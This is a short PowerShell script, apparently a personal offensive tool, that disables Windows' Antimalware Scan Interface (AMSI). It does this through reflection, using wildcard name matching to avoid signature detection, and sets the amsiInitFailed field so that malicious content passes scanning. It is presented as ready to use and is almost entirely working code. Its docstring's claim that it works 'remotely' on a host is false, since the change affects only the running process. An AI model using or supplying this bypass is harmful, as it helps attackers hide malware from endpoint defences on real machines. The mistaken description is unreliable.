"""
author: otter ʕ •ᴥ•ʔ

This script can be used to remotely disable the AMSI service on a host
by altering the values of the iUtils class.
"""

# gets all types defined in the current assembly at runtime
$a = [Ref].Assembly.GetTypes()
# iterates over types and checks if name contains "iUtils"
ForEach($b in $a) {if ($b.Name -like '*iUtils') {$c = $b}}
# if so gets all the fields defined in the type
$d = $c.GetFields('NonPublic,Static')
# iterates over fields and checks if name contains "Failed"
ForEach($e in $d) {if ($e.Name -like '*Failed') {$f = $e}}
# if so sets value to True disabling AMSI
# the AMSI API still returns a success even if content is malicious
$f.SetValue($null,$true)
